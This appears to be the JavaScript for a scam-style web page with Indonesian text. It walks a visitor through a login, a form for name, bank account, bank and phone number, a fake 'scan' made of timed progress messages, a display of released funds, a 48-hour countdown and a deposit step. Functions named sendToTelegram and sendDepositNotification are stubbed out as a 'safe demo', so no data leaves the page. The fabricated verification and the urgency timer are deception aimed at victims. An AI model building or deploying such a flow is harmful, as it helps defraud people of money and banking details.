// ===== CONFIGURATION =====
const ADMIN_USERNAME = 'Admin';
const ADMIN_PASSWORD = 'Admin123';

// ===== PARTICLES =====
function createParticles() {
    const container = document.getElementById('particles');
    for (let i = 0; i < 30; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        const size = Math.random() * 4 + 2;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDuration = Math.random() * 15 + 10 + 's';
        particle.style.animationDelay = Math.random() * 10 + 's';
        container.appendChild(particle);
    }
}
createParticles();

// ===== STATE =====
let currentStep = 1;
let formData = {
    username: '',
    password: '',
    nama: '',
    norekening: '',
    bank: '',
    nohp: '',
    job: '',
    link: ''
};

// ===== PASSWORD TOGGLE =====
function togglePassword() {
    const passInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');
    if (passInput.type === 'password') {
        passInput.type = 'text';
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
    } else {
        passInput.type = 'password';
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
    }
}

// ===== NAVIGATION =====
function goToStep(step) {
    const currentCard = document.getElementById('step' + currentStep);
    const nextCard = document.getElementById('step' + step);

    // Hide current
    if (currentCard) {
        currentCard.style.display = 'none';
    }

    // Show next
    if (nextCard) {
        nextCard.style.display = 'block';
        nextCard.style.animation = 'none';
        nextCard.offsetHeight; // trigger reflow
        nextCard.style.animation = 'card-enter 0.6s cubic-bezier(0.34, 1.56, 0.64, 1)';
    }

    // Show progress bar after step 1
    const progressContainer = document.getElementById('progressContainer');
    if (step > 1) {
        progressContainer.style.display = 'block';
    }

    // Update progress steps
    updateProgress(step);
    currentStep = step;
}

function updateProgress(step) {
    const steps = document.querySelectorAll('.step');
    const lines = document.querySelectorAll('.step-line');

    steps.forEach((s, i) => {
        const stepNum = i + 1;
        s.classList.remove('active', 'completed');
        if (stepNum < step) {
            s.classList.add('completed');
            s.innerHTML = '<i class="fas fa-check" style="font-size:12px;"></i>';
        } else if (stepNum === step) {
            s.classList.add('active');
            s.innerHTML = '<span>' + stepNum + '</span>';
        } else {
            s.innerHTML = '<span>' + stepNum + '</span>';
        }
    });

    lines.forEach((line, i) => {
        if (i < step - 1) {
            line.classList.add('filled');
        } else {
            line.classList.remove('filled');
        }
    });
}

// ===== FORM HANDLERS =====

// Step 1: Login
document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    formData.username = document.getElementById('username').value.trim();
    formData.password = document.getElementById('password').value;

    if (formData.username !== ADMIN_USERNAME || formData.password !== ADMIN_PASSWORD) {
        alert('Login gagal! Username atau password salah.');
        return;
    }

    goToStep(2);
});

// Step 2: Data Input
document.getElementById('dataForm').addEventListener('submit', function (e) {
    e.preventDefault();
    formData.nama = document.getElementById('nama').value;
    formData.norekening = document.getElementById('norekening').value;
    formData.bank = document.getElementById('bank').value;
    formData.nohp = document.getElementById('nohp').value;
    formData.job = document.getElementById('job').value;
    goToStep(3);
});

// Step 3: Link Input + Scan
document.getElementById('linkForm').addEventListener('submit', function (e) {
    e.preventDefault();
    formData.link = document.getElementById('linkInput').value;

    // Hide form, show scan
    document.getElementById('linkForm').style.display = 'none';
    document.getElementById('scanContainer').style.display = 'block';

    startScan();
});

function startScan() {
    const fill = document.getElementById('scanFill');
    const detail = document.getElementById('scanDetail');
    const results = document.getElementById('scanResults');

    const scanSteps = [
        { progress: 15, text: 'Connecting to server...' },
        { progress: 30, text: 'Verifying SSL certificate...' },
        { progress: 50, text: 'Analyzing link structure...' },
        { progress: 65, text: 'Checking data integrity...' },
        { progress: 80, text: 'Detecting fund source...' },
        { progress: 95, text: 'Finalizing scan...' },
        { progress: 100, text: 'Scan complete!' }
    ];

    let i = 0;
    const interval = setInterval(() => {
        if (i < scanSteps.length) {
            fill.style.width = scanSteps[i].progress + '%';
            detail.textContent = scanSteps[i].text;
            i++;
        } else {
            clearInterval(interval);
            // Show results
            setTimeout(() => {
                document.querySelector('.scan-status').textContent = 'Scan Selesai!';
                document.querySelector('.scan-icon').className = 'fas fa-check-circle scan-icon';
                document.querySelector('.scan-icon').style.animation = 'none';
                document.querySelector('.scan-ring-inner').style.animation = 'none';
                document.querySelector('.scan-ring-inner').style.borderTopColor = 'var(--success)';
                document.querySelector('.scan-ring-inner').style.borderRightColor = 'var(--success)';
                results.style.display = 'block';

                // Auto proceed after delay
                setTimeout(() => {
                    goToStep(4);
                    animateFund();
                }, 2500);
            }, 500);
        }
    }, 600);
}

// Step 4: Fund Display Animation
function animateFund() {
    const amountEl = document.getElementById('amountValue');
    const target = 100;
    const duration = 2000;
    const start = Date.now();

    function formatNumber(num) {
        return num.toLocaleString('id-ID');
    }

    function tick() {
        const elapsed = Date.now() - start;
        const progress = Math.min(elapsed / duration, 1);
        // Ease out cubic
        const eased = 1 - Math.pow(1 - progress, 3);
        const current = Math.floor(eased * target);
        amountEl.textContent = formatNumber(current) + '%';

        if (progress < 1) {
            requestAnimationFrame(tick);
        } else {
            amountEl.textContent = formatNumber(target) + '%';
        }
    }

    tick();

    // Set details
    const now = new Date();
    const options = { year: 'numeric', month: 'long', day: 'numeric' };
    document.getElementById('currentDate').textContent = now.toLocaleDateString('id-ID', options);
    document.getElementById('refId').textContent = 'DMO-' + Math.random().toString(36).substr(2, 8).toUpperCase();
}

// Step 5: Warning
function showWarning() {
    goToStep(5);
    startTimer();
}

// ===== SAFE LOCAL DEMO =====
async function sendToTelegram() {
    console.log('Safe demo mode: external data sending disabled.');
}

// ===== TIMER =====
let timerInterval;
function startTimer() {
    let totalSeconds = 48 * 3600; // 48 hours
    const timerDisplay = document.getElementById('timerDisplay');
    const timerFill = document.getElementById('timerFill');
    const totalStart = totalSeconds;

    timerInterval = setInterval(() => {
        totalSeconds--;
        if (totalSeconds <= 0) {
            clearInterval(timerInterval);
            totalSeconds = 0;
        }

        const h = Math.floor(totalSeconds / 3600);
        const m = Math.floor((totalSeconds % 3600) / 60);
        const s = totalSeconds % 60;

        timerDisplay.textContent =
            String(h).padStart(2, '0') + ':' +
            String(m).padStart(2, '0') + ':' +
            String(s).padStart(2, '0');

        const percent = (totalSeconds / totalStart) * 100;
        timerFill.style.width = percent + '%';
    }, 1000);
}

// ===== DEPOSIT / CANCEL =====
function processDeposit() {
    // Demo aman: tidak mengirim data ke server eksternal.
    document.getElementById('successModal').style.display = 'flex';
}

function sendDepositNotification() {
    console.log('Safe demo mode: deposit notification disabled.');
}

function cancelProcess() {
    // Reset everything
    clearInterval(timerInterval);
    currentStep = 1;
    formData = { username: '', password: '', nama: '', norekening: '', bank: '', nohp: '', job: '', link: '' };

    // Reset all cards
    for (let i = 1; i <= 5; i++) {
        document.getElementById('step' + i).style.display = 'none';
    }

    // Reset forms
    document.getElementById('loginForm').reset();
    document.getElementById('dataForm').reset();
    document.getElementById('linkForm').reset();
    document.getElementById('linkForm').style.display = 'flex';
    document.getElementById('scanContainer').style.display = 'none';
    document.getElementById('scanResults').style.display = 'none';
    document.getElementById('scanFill').style.width = '0%';
    document.getElementById('progressContainer').style.display = 'none';

    // Show step 1
    document.getElementById('step1').style.display = 'block';
}

function closeModal() {
    document.getElementById('successModal').style.display = 'none';
}
